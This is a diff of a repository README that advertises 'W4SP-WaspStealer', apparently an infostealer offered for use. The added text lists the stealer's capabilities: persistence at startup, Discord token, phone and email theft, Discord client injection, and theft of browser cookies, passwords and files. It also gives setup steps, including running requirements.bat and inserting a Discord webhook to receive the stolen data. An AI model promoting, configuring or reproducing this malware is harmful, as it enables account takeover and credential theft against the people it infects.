@@ -1,8 +1,29 @@
 # W4SP-WaspStealer
 Original Wasp Source! 
 
--Created my account to share the original source, uploaded directly from 'Lotus' - the creator. 
+                          🤖 Futures
+- Startup
 
--Make sure to run 'requirements.bat'
+- Grab Discord Token, Phone Number, E-mail and HQ Friends.
 
--Input your discord webhook on 'x'
+- Discord Injection
+
+- Grab Browser cookies & passwords
+
+- Grab specific files
+
+                            ⬇️ Setup
+
+                                                  
+- first open `requirements.bat`
+
+- Insert discord webhook on Ln 23 hook = "x"
+
+                             🖼️ Pictures
+
+<div align="center">
+    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="https://i.ibb.co/yk5dfbK/Screenshot-2023-05-27-131935.png"></img> 
+    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="https://i.ibb.co/yk5dfbK/Screenshot-2023-05-27-131935.png"></img>
+   
+ 
+</div>
